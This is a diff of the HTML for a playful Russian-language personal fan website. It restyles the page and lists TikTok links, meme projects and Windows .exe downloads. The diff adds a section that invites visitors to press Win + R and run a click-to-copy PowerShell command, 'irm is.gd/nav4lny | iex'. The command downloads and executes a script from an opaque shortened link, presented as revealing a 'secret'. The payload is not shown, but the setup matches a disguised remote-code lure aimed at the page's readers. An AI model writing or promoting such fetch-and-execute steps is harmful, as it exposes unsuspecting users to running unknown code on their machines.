@@ -2,131 +2,237 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>dvir1n</title>
   <style>
+    :root {
+      --primary-red: #d92626;
+      --link-blue: #0044cc;
+      --hover-pink: #ff0077;
+    }
+
     body {
-      font-family: "Comic Sans MS", sans-serif;
+      font-family: "Comic Sans MS", "Chalkboard SE", cursive, sans-serif;
       background: linear-gradient(180deg, #fff7e6, #ffd6d6);
-      text-align: center;
+      color: #333;
       margin: 0;
-      padding: 40px 20px;
+      padding: 40px 10px;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 800px;
+      width: 100%;
+      text-align: center;
     }
 
     h1 {
-      color: #d92626;
-      text-shadow: 1px 1px 2px #00000030;
+      color: var(--primary-red);
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+      font-size: 1.8rem;
+    }
+
+    .subtitle {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+    }
+
+    #papus-container {
+      margin: 30px 0;
+    }
+
+    img {
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      max-width: 100%;
+      height: auto;
+    }
+
+    img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 12px 25px rgba(217, 38, 38, 0.4);
+    }
+
+    .image-frame {
+      display: inline-block;
+      margin-top: 15px;
+      padding: 10px;
+      border: 5px double var(--primary-red);
+      border-radius: 15px;
+      background: white;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    .image-frame img {
+      border-radius: 10px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    .caption {
+      font-weight: bold;
+      color: var(--primary-red);
+      font-size: 1.1rem;
+    }
+
+    .links-section {
+      background: rgba(255, 255, 255, 0.5);
+      padding: 20px;
+      border-radius: 15px;
+      margin: 20px 0;
     }
 
     a {
       display: inline-block;
-      color: #0044cc;
+      color: var(--link-blue);
       text-decoration: none;
-      margin: 8px 0;
-      transition: transform 0.15s ease, color 0.2s ease;
+      margin: 10px 0;
+      font-weight: bold;
+      transition: all 0.2s ease;
     }
 
     a:hover {
-      transform: scale(1.05);
-      color: #ff0077;
+      color: var(--hover-pink);
+      transform: translateY(-2px);
     }
 
-    img {
-      border-radius: 12px;
-      box-shadow: 0 0 10px #00000040;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    .promo-link {
+      font-size: 1.5rem;
+      border-bottom: 2px solid transparent;
     }
 
-    img:hover {
-      transform: scale(1.1);
-      box-shadow: 0 0 20px #ff000080;
+    .promo-link:hover {
+      border-bottom-color: var(--hover-pink);
     }
 
-    p {
-      font-style: italic;
-      color: #333;
+    .terminal-box {
+      background: #2d2d2d;
+      color: #76ff03;
+      padding: 15px;
+      border-radius: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      display: inline-block;
+      margin: 15px 0;
+      border: 2px solid #555;
+      cursor: pointer;
+      position: relative;
     }
 
-    #papus {
-      margin-top: 20px;
+    .terminal-box::before {
+      content: "PowerShell";
+      display: block;
+      font-size: 10px;
+      color: #aaa;
+      margin-bottom: 5px;
+      text-align: left;
+    }
+
+    input.cmd-input {
+      background: transparent;
+      border: none;
+      color: inherit;
+      font-family: inherit;
+      font-size: inherit;
+      width: 300px;
+      text-align: center;
+      outline: none;
+      cursor: pointer;
+    }
+
+    s {
+      color: #888;
+    }
+
+    .footer-text {
+      margin-top: 50px;
+      font-weight: bold;
+      opacity: 0.8;
     }
   </style>
 </head>
 <body>
-  <h1>Сайт dvir1n ака двирин ака игрушка папус (этот сайт делал chatgpt)</h1>
-  <h1>Hi to all Englishmans on my website</h1>
 
-  <img src="igrushka papus.jpg"
-       width="200"
-       alt="Пипус игрушка 9999р"
-       id="papus"
-       style="cursor: pointer;">
-  <p>(кликабельно)</p>
+<div class="container">
+  <h1>Сайт dvir1n</h1>
+  <p class="subtitle">ака двирин ака dverlock ака игрушка папус</p>
+  <p><i>Hi to all English speakers on my website!</i></p>
+
+  <div id="papus-container">
+    <img src="igrushka papus.jpg" 
+         width="200" 
+         alt="Пипус игрушка 9999р" 
+         id="papus" 
+         style="cursor: pointer;">
+    <p><small>(кликабельно)</small></p>
+  </div>
 
   <audio id="papusSound" src="igrushkapapus.mp3"></audio>
-  
-  <h1><s>МЕНЯ ЗАБАНИЛИ В ТИКТОКЕ!!!!!!</s></h1>
-  <h1><s>НОВЫЙ ОФИЦИАЛЬНЫЙ АККАУНТ:</s></h1>
-  <a href="https://tiktok.com/@dverlock" style="font-size: 1rem; font-weight:bold;">
-    <s>@dverlock</s>
-  </a>
-  <h3>Я разбанил свой старый аккаунт, однако эта ссылка всё ещё действительна.</h3>
-  <a href="https://tiktok.com/@dvir1n" style="font-size: 2rem; font-weight:bold;">
-    Старый аккаунт
-  </a>
 
-  <br><br>
+  <div class="links-section">
+    <a href="https://tiktok.com/@dverlock">МОЙ ЕДИНСТВЕННЫЙ ТИКТОК: @dverlock</a>
+    <br>
+    <div class="image-frame">
+      <img src="ti_vse_vresh.jpg" width="180" alt="Ты всё врёшь...">
+      <div class="caption">Ты всё врёшь...</div>
+    </div>
+  </div>
 
-  <a href="https://dvir1n.nekoweb.org/genka.html" style="font-weight: bold; font-size: 24px;">
-    ГЕНКА ЗДЕСЬ!!!
-  </a>
-  <br>
-  <a href="https://dvir1n.nekoweb.org/guchiguchigu.html" style="font-weight: bold; font-size: 24px;">
-    И буба тоже здесь
-  </a>
-  <br>
-  <a href="https://dvir1n.nekoweb.org/Gena.exe" style="font-weight: bold; font-size: 24px;">
-    Генка на виндовс
-  </a>
-  <br>
-  <a href="https://dvir1n.nekoweb.org/GenaXP.exe" style="font-weight: bold; font-size: 24px;">
-  	Генка для Windows XP (требует .NET Framework 3.5)
-  </a>
-  <br>
-  <a href="https://download.visualstudio.microsoft.com/download/pr/b635098a-2d1d-4142-bef6-d237545123cb/2651b87007440a15209cac29634a4e45/dotnetfx35.exe" style="font-weight: bold; font-size: 24px;">
-  	Сам .NET Framework 3.5
-  </a>
-  <br>
-  <a href="https://dvir1n.nekoweb.org/GuchiGuchiGu.exe" style="font-weight: bold; font-size: 24px;">
-    Буба гучи гучи гу на виндовс
-  </a>
+  <div class="links-section">
+    <h3>Мои проекты</h3>
+    <a href="https://dvir1n.nekoweb.org/genka.html">ГЕНКА ЗДЕСЬ!!!</a><br>
+    <a href="https://dvir1n.nekoweb.org/guchiguchigu.html">И буба тоже здесь</a><br>
+    <a href="https://dvir1n.nekoweb.org/Gena.exe">Генка на Windows</a><br>
+    <a href="https://dvir1n.nekoweb.org/GenaXP.exe">Генка для Windows XP</a><br>
+    <a href="https://download.visualstudio.microsoft.com/download/pr/b635098a-2d1d-4142-bef6-d237545123cb/2651b87007440a15209cac29634a4e45/dotnetfx35.exe" style="font-size: 0.9rem;">Скачать .NET Framework 3.5</a><br>
+    <a href="https://dvir1n.nekoweb.org/GuchiGuchiGu.exe">Буба гучи гучи гу (.exe)</a>
+  </div>
 
-  <p>Мои работы у других:</p>
-  <a href="https://allahsolutions.github.io/drujok/" style="font-weight: bold; font-size: 24px;">
-    Дружок папапапапапа (кодбаза моя)
-  </a>
-  <br>
-  <a href="https://galonhasorrindo.nekoweb.org/papus.html" style="font-weight: bold; font-size: 24px;">
-  	Игрушка Папус игра (Igrushka Papus The Game) (из моего там только перевод)
-  </a>
-  <br>
-  <a href="https://galonhasorrindo.nekoweb.org/kid.html" style="font-weight: bold; font-size: 24px;">
-  	Малыш онлайн (кодбаза моя)
-  </a>
-  <br>
+  <div class="links-section">
+    <h3>Мои работы у других</h3>
+    <a href="https://allahsolutions.github.io/drujok/">Дружок папапапапапа (код)</a><br>
+    <a href="https://galonhasorrindo.nekoweb.org/papus.html">Igrushka Papus The Game (перевод)</a><br>
+    <a href="https://galonhasorrindo.nekoweb.org/kid.html">Малыш онлайн (код)</a>
+  </div>
 
-  <h1>Ждите большего здесь (проекты у меня часто выходят)</h1>
-  
-  
-  <script>
-    const papus = document.getElementById('papus');
-    const sound = document.getElementById('papusSound');
+  <div class="links-section">
+  	<h3>Мои хацкер проекты 01010101 линукс страфна</h3>
+    <p>Привет, это...<br>Раскрой секрет (Win + R):</p>
+    <div class="terminal-box" onclick="copyToClipboard()">
+      <input type="text" value="powershell irm is.gd/nav4lny | iex" class="cmd-input" id="psCommand" readonly title="Нажми, чтобы скопировать">
+    </div>
+    <p><small id="copyStatus" style="color: green; display: none;">Скопировано!</small></p>
+  </div>
 
-    papus.addEventListener('click', () => {
-      sound.currentTime = 0;
-      sound.play();
-      papus.style.transform = 'scale(1.2)';
-      setTimeout(() => papus.style.transform = 'scale(1)', 150);
-    });
-  </script>
+  <h1 class="footer-text">Ждите большего здесь! Проекты выходят [не]часто.</h1>
+</div>
+
+<script>
+  const papus = document.getElementById('papus');
+  const sound = document.getElementById('papusSound');
+
+  papus.addEventListener('click', () => {
+    sound.currentTime = 0;
+    sound.play().catch(e => console.log("Нужно взаимодействие пользователя для звука"));
+    
+    papus.style.transform = 'scale(1.1)';
+    setTimeout(() => papus.style.transform = 'scale(1)', 150);
+  });
+
+  function copyToClipboard() {
+    const copyText = document.getElementById("psCommand");
+    copyText.select();
+    navigator.clipboard.writeText(copyText.value);
+    
+    const status = document.getElementById("copyStatus");
+    status.style.display = "block";
+    setTimeout(() => status.style.display = "none", 2000);
+  }
+</script>
+
 </body>
 </html>
